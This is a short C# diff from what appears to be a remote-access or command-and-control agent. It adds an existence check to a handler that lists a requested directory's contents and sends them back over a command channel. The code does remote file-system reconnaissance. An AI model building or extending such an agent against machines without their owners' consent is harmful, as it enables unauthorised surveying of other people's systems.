@@ -58,21 +58,32 @@ namespace Reno.Stages
                         {
                             byte[] dirBytes = channel.ReceiveBytes(header.DataLength);
                             string sDir = Encoding.UTF8.GetString(dirBytes);
-                            DirectoryInfo dir = new DirectoryInfo(sDir);
-                            Console.WriteLine("Directory {0}", dir.FullName);
-                            directory += dir.FullName + "\n";
-                            foreach (DirectoryInfo i in dir.EnumerateDirectories())
+                            if (Directory.Exists(sDir))
                             {
-                                directory += i.FullName + "\n";
+                                DirectoryInfo dir = new DirectoryInfo(sDir);
+                                Console.WriteLine("Directory {0}", dir.FullName);
+                                directory += dir.FullName + "\n";
+                                foreach (DirectoryInfo i in dir.EnumerateDirectories())
+                                {
+                                    directory += i.FullName + "\n";
+                                }
+                                foreach (string file in Directory.EnumerateFiles(sDir))
+                                {
+                                    directory += file + "\n";
+                                }
+                                CommHeader h = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, directory.Length);
+                                Console.WriteLine("[*] Sending {0}", directory);
+                                channel.SendHeader(h);
+                                channel.SendBytes(Encoding.UTF8.GetBytes(directory));
                             }
-                            foreach (string file in Directory.EnumerateFiles(sDir))
+                            else
                             {
-                                directory += file + "\n";
+                                string error = "Directory does not exist";
+                                CommHeader h = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, error.Length);
+                                Console.WriteLine("[*] Sending {0}", error);
+                                channel.SendHeader(h);
+                                channel.SendBytes(Encoding.UTF8.GetBytes(error));
                             }
-                            CommHeader h = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, directory.Length);
-                            Console.WriteLine("[*] Sending {0}", directory);
-                            channel.SendHeader(h);
-                            channel.SendBytes(Encoding.UTF8.GetBytes(directory));
                         }
                         break;
                     case CommChannel.PWD:
